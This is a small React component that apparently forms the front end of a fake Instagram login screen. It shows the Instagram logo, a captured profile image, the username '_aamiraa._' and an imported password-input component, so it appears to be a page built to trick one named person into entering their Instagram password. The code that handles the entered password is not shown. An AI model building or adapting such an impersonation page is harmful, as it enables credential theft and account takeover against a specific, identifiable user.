import React from 'react';
import InstagramPasswordInput from './inst.js';
import insta from './8n91YnfPq0s (1).png';
import phot from './Capture.png';
import './InstagramInput.css';

function App() {
  return (
    <div className="App">
      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: '200px' }}>
        <img src={insta} alt="Instagram" />
        <img style={{ marginTop: '20px' }} src={phot} alt="Photo" />
        <p className='username'>_aamiraa._</p>
        <InstagramPasswordInput />
      </div>
    </div>
  );
}

export default App;

